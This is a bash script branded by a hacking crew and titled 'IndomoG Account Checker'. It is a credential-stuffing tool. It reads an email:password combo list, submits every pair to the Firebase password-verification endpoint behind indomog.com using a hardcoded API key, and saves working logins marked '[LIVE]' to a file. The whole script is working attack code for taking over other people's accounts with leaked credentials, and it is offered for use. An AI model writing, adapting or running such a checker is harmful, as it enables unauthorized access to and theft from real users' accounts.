#!/bin/bash
#issued on : 19 agustus 2018
#coded By Arvan Apriyana
waktu=$(date '+%Y-%m-%d %H:%M:%S')
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
CYAN="\e[36m"
LIGHTGREEN="\e[92m"
MARGENTA="\e[35m"
BLUE="\e[34m"
BOLD="\e[1m"
NOCOLOR="\e[0m"
header(){
printf "${GREEN}
         ####################################
         ####################################
         #######                      #######
         #######                      #######${BLUE}
         ####### www.tatsumi-crew.net #######
         ###############      ###############
         ###############      ###############
         ###############      ###############
         ###############      ###############${RED}
         #######    ####      ####    #######
         #######    ####      ####    #######
         #######    ##############    #######
         #######    ##############    #######
         #######                      #######
         ####################################
         ####################################${NOCOLOR}
         ------------------------------------
                IndomoG Account Checker
         ------------------------------------
"
}
scanskrng(){ #function
    cekvalid=$(curl 'https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyAKvWzH3P-8ibsHRvE0wPP4i3kvCwYgPS4' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:61.0) Gecko/20100101 Firefox/61.0' -H 'Accept: */*' -H 'Accept-Language: en-GB,en;q=0.5' --compressed -H 'Referer: https://www.indomog.com/' -H 'Content-Type: application/json' -H 'X-Client-Version: Firefox/JsCore/4.5.2/FirebaseCore-web' -H 'Origin: https://www.indomog.com' -H 'Connection: keep-alive' --data '{"email":"'$1'","password":"'$2'","returnSecureToken":true}' --compressed -D - -s);
    cek=$(echo $cekvalid | grep -Po '(?<=registered":)[^}]*' | sed 's/\[\"//g' | sed 's/\"\]//g')
    if [[ $cek =~ "true" ]]; then 
        printf "${GREEN}[LIVE] $1|$2\n";
        echo "[LIVE] $1|$2 [Point:$cok] [$waktu]" >> live.txt
        printf "${NORMAL}"
    else
        printf "${RED}[DIE] $1|$2 [$waktu]\n";
        printf "${NORMAL}"
    fi
}
header
echo ""
echo "List In This Directory : "
ls
echo "Delimeter list -> email:password"
echo -n "Masukan File List : "
read list
if [ ! -f $list ]; then
    echo "$list No Such File"
exit
fi
    x=$(gawk -F: '{ print $1 }' $list)
    y=$(gawk -F: '{ print $2 }' $list)
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'emailgblg=($x)'
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'passwordna=($y)'
for (( i = 0; i < "${#emailgblg[@]}"; i++ )); do
    emailna="${emailgblg[$i]}"
    kontol="${passwordna[$i]}"
        scanskrng $emailna $kontol
done
